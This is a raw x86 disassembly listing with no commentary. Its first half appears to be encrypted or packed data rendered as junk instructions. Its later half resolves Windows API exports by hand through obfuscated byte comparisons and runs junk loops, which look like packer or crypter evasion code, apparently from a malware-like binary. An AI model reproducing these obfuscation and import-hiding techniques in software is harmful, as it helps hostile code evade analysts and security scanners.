  40ff0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff0e:	jg     0x40ff4f
  40ff10:	jne    0x40ff04
  40ff12:	fisttp DWORD PTR [ecx+0x5e]
  40ff15:	xchg   edi,eax
  40ff16:	rcl    ecx,cl
  40ff18:	xor    ch,BYTE PTR [edi]
  40ff1a:	xor    BYTE PTR [ebx],ch
  40ff1c:	cmp    eax,edi
  40ff1e:	call   0x2501811a
  40ff23:	inc    esi
  40ff24:	jl     0x40ff27
  40ff26:	in     al,0x2
  40ff28:	neg    BYTE PTR [edi]
  40ff2a:	icebp  
  40ff2b:	mov    bl,0x8a
  40ff2d:	je     0x40ff35
  40ff2f:	add    BYTE PTR [ebx],ch
  40ff31:	or     eax,0x14e5afac
  40ff36:	xchg   esi,eax
  40ff37:	push   esp
  40ff38:	test   al,0x5a
  40ff3a:	cmp    DWORD PTR [ebx*1+0x1549ef14],ebx
  40ff41:	cmp    ebp,DWORD PTR [ecx]
  40ff43:	imul   DWORD PTR [ebx+0x7b0e2519]
  40ff49:	xchg   edi,esp
  40ff4b:	ret    0xf6ea
  40ff4e:	sahf   
  40ff4f:	out    0x96,al
  40ff51:	jne    0x40ff36
  40ff53:	xchg   ebp,eax
  40ff54:	cmc    
  40ff55:	fdiv   QWORD PTR [edx-0x7e]
  40ff58:	push   ecx
  40ff59:	(bad)
  40ff5c:	mov    ds:0xc0f3bb78,eax
  40ff61:	lea    ebx,[esi+eiz*2+0x52]
  40ff65:	(bad)  
  40ff66:	popa   
  40ff67:	daa    
  40ff68:	mov    al,0x79
  40ff6a:	jns    0x40ffc7
  40ff6c:	or     BYTE PTR [ebx-0xa8752be],dh
  40ff72:	daa    
  40ff73:	leave  
  40ff74:	add    BYTE PTR [esp+edi*8+0x33d31b90],ah
  40ff7b:	adc    al,0x7b
  40ff7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff7e:	push   esi
  40ff7f:	adc    ebx,DWORD PTR [esi-0x2513e860]
  40ff85:	inc    edx
  40ff86:	push   ebp
  40ff87:	jg     0x40ff59
  40ff89:	ret    0x4c93
  40ff8c:	jb     0x40ffc5
  40ff8e:	jns    0x40fff4
  40ff90:	jmp    0x89ec:0xe69bac09
  40ff97:	sub    DWORD PTR [esi-0x23],0xbb52500e
  40ff9e:	and    al,BYTE PTR [esi+0x27]
  40ffa1:	and    al,0x6e
  40ffa3:	enter  0xc713,0xa4
  40ffa7:	adc    ebx,edi
  40ffa9:	cld    
  40ffaa:	pop    es
  40ffab:	cli    
  40ffac:	or     DWORD PTR [edx+eiz*2-0x7eac969],0xffffffc6
  40ffb4:	out    dx,eax
  40ffb5:	adc    eax,0x51d21780
  40ffba:	cmp    eax,DWORD PTR [ecx-0x3f]
  40ffbd:	(bad)  
  40ffbe:	push   eax
  40ffbf:	pop    ebx
  40ffc0:	sbb    ch,BYTE PTR [ebp+0x25eed77b]
  40ffc6:	push   ss
  40ffc7:	add    edx,DWORD PTR [ecx]
  40ffc9:	rcl    cl,cl
  40ffcb:	xor    BYTE PTR [edi+0x20],bh
  40ffce:	pop    ebp
  40ffcf:	fisubr WORD PTR [edi+0x789c8418]
  40ffd5:	ds enter 0x9bfe,0xc7
  40ffda:	sar    DWORD PTR [edx+0x153dfab7],0xc5
  40ffe1:	add    DWORD PTR [esi-0x7b],0xffffffda
  40ffe5:	cmp    bh,BYTE PTR [ebx+0x27cee927]
  40ffeb:	iret   
  40ffec:	imul   edx,DWORD PTR [ecx+0x7ca97d4e],0xf0fb8fbc
  40fff6:	xchg   esp,eax
  40fff7:	jmp    0x5763c2f4
  40fffc:	sbb    bl,BYTE PTR [ecx]
  40fffe:	pop    ss
  40ffff:	aaa    
  410000:	aas    
  410001:	push   esi
  410002:	adc    DWORD PTR [ebp-0x79f091c],0x5e19b3e5
  41000c:	or     DWORD PTR [edx-0x5ebd1973],0xfffffffc
  410013:	aam    0x96
  410015:	arpl   di,di
  410017:	loope  0x41007a
  410019:	jmp    0x9ece2733
  41001e:	jp     0x410003
  410020:	mov    BYTE PTR [ebx-0x5c],bh
  410023:	imul   edi,DWORD PTR [eax-0x245d0ba4],0xffffff8f
  41002a:	add    bl,BYTE PTR [ebp+0x5fd298b9]
  410030:	xor    ebx,edx
  410032:	or     DWORD PTR [esp+ecx*2],edx
  410035:	call   0x744815f4
  41003a:	push   ecx
  41003b:	fs mov ebp,0x91475c58
  410041:	add    DWORD PTR [eax],esi
  410043:	or     al,BYTE PTR [ebx+0x56696a81]
  410049:	int    0x29
  41004b:	and    eax,DWORD PTR es:0x872fe49b
  410052:	int3   
  410053:	leave  
  410054:	xchg   edx,eax
  410055:	ret    
  410056:	ss ins DWORD PTR es:[edi],dx
  410058:	int    0x27
  41005a:	je     0x40ffe1
  41005c:	sub    BYTE PTR [ebp+0x2e945bbe],0xe5
  410063:	mov    al,ds:0xe4e527d2
  410068:	outs   dx,BYTE PTR ds:[esi]
  410069:	hlt    
  41006a:	push   ss
  41006b:	adc    ah,BYTE PTR [esi+0x23c46476]
  410071:	inc    ebp
  410072:	inc    eax
  410073:	xchg   esp,eax
  410074:	inc    ebp
  410075:	sub    bl,dl
  410077:	neg    edi
  410079:	dec    ebp
  41007a:	je     0x41009d
  41007c:	adc    BYTE PTR [eax+0x71],ch
  41007f:	pop    ebp
  410080:	scas   eax,DWORD PTR es:[edi]
  410081:	inc    edi
  410082:	dec    eax
  410083:	and    ecx,DWORD PTR [esi+0x4d]
  410086:	scas   eax,DWORD PTR es:[edi]
  410087:	or     bl,ah
  410089:	adc    DWORD PTR ds:0xea27e570,edi
  41008f:	adc    eax,0x7affb150
  410094:	sbb    BYTE PTR [edi+0x69e6fa99],0xbc
  41009b:	sbb    BYTE PTR [eax+0x4713272f],ch
  4100a1:	add    eax,edi
  4100a3:	and    BYTE PTR [edx+0x31f0b9fb],bl
  4100a9:	push   0x20d01ff6
  4100ae:	das    
  4100af:	sbb    ecx,esp
  4100b1:	push   ds
  4100b2:	aam    0x2c
  4100b4:	icebp  
  4100b5:	add    al,0xed
  4100b7:	add    ebp,DWORD PTR [edx]
  4100b9:	sahf   
  4100ba:	fidivr WORD PTR [edi-0x5fdb665f]
  4100c0:	pop    eax
  4100c1:	mov    eax,0x3606ab80
  4100c6:	xor    cl,BYTE PTR [edi-0x63e964d4]
  4100cc:	js     0x410071
  4100ce:	data16 das 
  4100d0:	loopne 0x410083
  4100d2:	dec    edi
  4100d3:	fistp  WORD PTR [esi+0x6b78149e]
  4100d9:	mov    dh,0x13
  4100db:	cmp    eax,DWORD PTR [esi-0x47491298]
  4100e1:	sbb    al,BYTE PTR [eax-0x22]
  4100e4:	push   ds
  4100e5:	adc    al,0xf6
  4100e7:	dec    edx
  4100e8:	repnz fwait
  4100ea:	cld    
  4100eb:	popa   
  4100ec:	mov    eax,fs:0x1f7ba8a2
  4100f2:	test   ah,al
  4100f4:	lods   eax,DWORD PTR ds:[esi]
  4100f5:	in     al,dx
  4100f6:	push   eax
  4100f7:	retf   
  4100f8:	mov    dh,0xb2
  4100fa:	mov    ah,0x15
  4100fc:	jp     0x4100a7
  4100fe:	pop    ds
  4100ff:	cs push esi
  410101:	cmc    
  410102:	shr    BYTE PTR [ebx-0x1ee99eb3],0x1
  410109:	lds    edi,FWORD PTR [esp+edx*4+0x4c508c42]
  410110:	xor    al,0x82
  410112:	jae    0x4100c0
  410114:	in     eax,0xe0
  410116:	xchg   esi,eax
  410117:	ret    
  410118:	inc    esi
  410119:	das    
  41011a:	mov    bl,0x34
  41011c:	and    cl,ch
  41011e:	push   edx
  41011f:	in     al,0x3a
  410121:	idiv   eax
  410123:	mov    BYTE PTR [edx],cl
  410125:	fldcw  WORD PTR [ecx+ecx*4-0x3a]
  410129:	test   DWORD PTR [edi-0x42],edx
  41012c:	inc    edi
  41012d:	or     dh,BYTE PTR [ebx]
  41012f:	xchg   esp,eax
  410130:	xor    ebp,DWORD PTR [eax+0xeed0e8a]
  410136:	int    0x2b
  410138:	jmp    0x9462:0x60f3f241
  41013f:	int3   
  410140:	mov    edx,0x85553aa1
  410145:	mov    al,ds:0xbd20c945
  41014a:	or     ecx,DWORD PTR [ebx+edi*8]
  41014d:	mov    edi,0xc5dfb6b1
  410152:	iret   
  410153:	xor    dl,dl
  410155:	shl    BYTE PTR [ecx-0x6b8ee454],0x94
  41015c:	push   esi
  41015d:	out    dx,al
  41015e:	outs   dx,DWORD PTR ds:[esi]
  41015f:	xchg   ecx,eax
  410160:	add    eax,0x34738cea
  410165:	lahf   
  410166:	dec    ebx
  410167:	cmp    DWORD PTR [ebx],edx
  410169:	fsubrp st(6),st
  41016b:	sub    ch,BYTE PTR [edx]
  41016d:	ins    DWORD PTR es:[edi],dx
  41016e:	out    dx,eax
  41016f:	ret    0x6452
  410172:	push   ebx
  410173:	mov    ss,WORD PTR [edi-0x4797fdd4]
  410179:	mov    ds:0xa504f9a3,eax
  41017e:	ss dec ebp
  410180:	mov    dh,0x5
  410182:	mov    ch,0xd4
  410184:	rcr    DWORD PTR [edi-0x4c718b8b],1
  41018a:	and    edi,DWORD PTR [ecx-0x6c]
  41018d:	out    0x42,eax
  41018f:	rcr    DWORD PTR [esi-0x36664033],0x39
  410196:	imul   eax,DWORD PTR [esi+ebx*4-0x36],0xa160c0db
  41019e:	xor    eax,0xb9a1122b
  4101a3:	ins    BYTE PTR es:[edi],dx
  4101a4:	pop    edx
  4101a5:	nop
  4101a6:	fst    QWORD PTR [ecx]
  4101a8:	in     al,dx
  4101a9:	fs jb  0x410218
  4101ac:	dec    edi
  4101ad:	in     eax,dx
  4101ae:	loope  0x4101eb
  4101b0:	sub    eax,0x777e2e0
  4101b5:	sbb    esi,DWORD PTR [ecx]
  4101b7:	adc    al,0xbe
  4101b9:	pop    esp
  4101ba:	jno    0x410211
  4101bc:	int3   
  4101bd:	lea    ecx,[edx]
  4101bf:	push   ds
  4101c0:	sbb    eax,0xe0e7b81d
  4101c5:	mov    esp,0x19d32575
  4101ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101cb:	push   0x23c123dd
  4101d0:	(bad)  [ecx+0x37]
  4101d3:	cli    
  4101d4:	and    dh,ch
  4101d6:	sbb    BYTE PTR [eax-0x1bbc405a],0xce
  4101dd:	neg    DWORD PTR [ebx+0xbe3bd00]
  4101e3:	test   eax,0xed0982dd
  4101e8:	xor    DWORD PTR [edi+0x413ffd],esi
  4101ee:	gs pushf 
  4101f0:	mov    edx,0x27e14538
  4101f5:	dec    edx
  4101f6:	and    DWORD PTR [edi],eax
  4101f8:	xchg   edi,eax
  4101f9:	sar    ebx,0x1e
  4101fc:	sbb    dl,BYTE PTR [edi+0x4]
  4101ff:	(bad)  
  410200:	in     eax,0x6b
  410202:	pop    DWORD PTR [edx-0x45]
  410205:	sbb    eax,0xb9028b48
  41020a:	repz popf 
  41020c:	jmp    0x41019c
  41020e:	or     DWORD PTR [ecx+esi*2],esp
  410211:	gs aas 
  410213:	mov    al,ds:0xbdd3f9d2
  410218:	bound  esp,QWORD PTR [ebx+0x70287920]
  41021e:	out    0x8d,eax
  410220:	std    
  410221:	xchg   edx,eax
  410222:	jae    0x4101e5
  410224:	push   0x9d7fa3e
  410229:	pushf  
  41022a:	xor    eax,0x3ff711f7
  41022f:	mov    bl,0x89
  410232:	xchg   edi,eax
  410233:	ds inc edx
  410235:	das    
  410236:	cmp    eax,0x86a471c6
  41023b:	adc    DWORD PTR [edi+0x5f5096ee],0x98b31666
  410245:	(bad)  
  410246:	sar    DWORD PTR [ebx],cl
  410248:	scas   al,BYTE PTR es:[edi]
  410249:	mov    cl,BYTE PTR [edx]
  41024b:	and    eax,0xf60c065e
  410250:	push   eax
  410251:	cmp    bh,dh
  410253:	lahf   
  410254:	cmp    BYTE PTR [ebp+0x7cb40533],bl
  41025a:	fistp  WORD PTR [ebx-0x5fb008e0]
  410260:	mov    ebx,0xca782496
  410265:	or     esp,DWORD PTR [edx+edx*4+0x39baf7a1]
  41026c:	add    esi,DWORD PTR [esi+eiz*4+0x19]
  410270:	sahf   
  410271:	adc    al,0x24
  410273:	loopne 0x4101fb
  410275:	inc    edi
  410276:	stos   BYTE PTR es:[edi],al
  410277:	clc    
  410278:	sub    al,0x94
  41027a:	nop
  41027b:	xchg   esi,eax
  41027c:	scas   al,BYTE PTR es:[edi]
  41027d:	mov    bh,0x6a
  41027f:	loop   0x410254
  410281:	xchg   esp,eax
  410282:	ss push ss
  410284:	dec    esp
  410285:	lahf   
  410286:	nop
  410287:	popa   
  410288:	rcr    edi,0x20
  41028b:	dec    ebp
  41028c:	fidivr DWORD PTR cs:[esi]
  41028f:	mov    DWORD PTR [ecx],ecx
  410291:	dec    esp
  410292:	fisub  WORD PTR [ebx]
  410294:	sbb    cl,al
  410296:	ret    
  410297:	mov    ah,dl
  410299:	je     0x4102fe
  41029b:	xchg   ebx,eax
  41029c:	(bad)  
  41029d:	jmp    0x3f70:0xa6373493
  4102a4:	pop    ecx
  4102a5:	cld    
  4102a6:	cs mov al,0x76
  4102a9:	and    edi,ecx
  4102ab:	das    
  4102ac:	jbe    0x410251
  4102ae:	push   esi
  4102af:	je     0x4102e1
  4102b1:	jl     0x41028c
  4102b3:	mov    edi,0x7135e99f
  4102b8:	(bad)  
  4102b9:	mov    bh,0xfc
  4102bb:	test   BYTE PTR [esp+eax*4],al
  4102be:	mov    dh,0xbb
  4102c0:	sbb    DWORD PTR [ecx-0x74],edi
  4102c3:	sti    
  4102c4:	mov    ds:0x70ee3020,al
  4102c9:	les    esp,FWORD PTR [eax+0x4f]
  4102cc:	add    ah,dh
  4102ce:	pop    eax
  4102cf:	pop    esp
  4102d0:	jecxz  0x410276
  4102d2:	retf   
  4102d3:	add    esp,DWORD PTR [eax+0x37]
  4102d6:	add    al,0xfa
  4102d8:	pop    ecx
  4102d9:	bound  ecx,QWORD PTR [edx-0x49c566f]
  4102df:	mov    eax,0x9bd6234a
  4102e4:	add    eax,0xaaaaf9e9
  4102e9:	jno    0x41029a
  4102eb:	sahf   
  4102ec:	jmp    0x410340
  4102ee:	push   ds
  4102ef:	sbb    BYTE PTR ds:0xe93a6a0f,al
  4102f5:	repnz dec ecx
  4102f7:	rcr    DWORD PTR [esi+0x3f],0xbc
  4102fb:	scas   eax,DWORD PTR es:[edi]
  4102fc:	push   eax
  4102fd:	cmc    
  4102fe:	inc    edx
  4102ff:	frstor [edi+0x65f2f147]
  410305:	push   ds
  410306:	xor    DWORD PTR [edx],edi
  410308:	dec    esi
  410309:	push   ds
  41030a:	and    al,0xb4
  41030c:	cdq    
  41030d:	test   BYTE PTR [edi],bl
  41030f:	mov    ds:0x648588b2,al
  410314:	sbb    BYTE PTR [edx],cl
  410316:	xchg   ecx,eax
  410317:	imul   ecx,edx,0x33
  41031a:	lods   eax,DWORD PTR ds:[esi]
  41031b:	jae    0x4102df
  41031d:	mov    edi,0x70901f2
  410322:	test   BYTE PTR [esi],ch
  410324:	jle    0x4103a5
  410326:	cdq    
  410327:	in     eax,0x3c
  410329:	scas   eax,DWORD PTR es:[edi]
  41032a:	sti    
  41032b:	mov    cl,0x18
  41032d:	cmp    DWORD PTR ds:0x12d87712,esp
  410333:	test   DWORD PTR [ecx+esi*4-0x2809676a],eax
  41033a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41033b:	push   0x4a
  41033d:	and    cl,BYTE PTR [esi+edx*4]
  410340:	sub    al,0x84
  410342:	or     BYTE PTR [edi+0x779d9602],bl
  410348:	adc    BYTE PTR [ebp+0x3131f7d2],dh
  41034e:	dec    edx
  41034f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410350:	shl    DWORD PTR [ebp-0x1811a7f5],cl
  410356:	aas    
  410357:	fwait
  410358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410359:	frstor [edx-0x54bd3786]
  41035f:	(bad)  
  410360:	outs   dx,BYTE PTR ds:[esi]
  410361:	or     eax,DWORD PTR [eax+ecx*1]
  410364:	adc    DWORD PTR [edx+ebp*1-0x2258e287],edi
  41036b:	pop    ecx
  41036c:	cwde   
  41036d:	mov    ebx,0x3b4b
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3ec
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff92
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d500
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4fc,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3ec
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffc1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3ec
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5e8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3ec
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
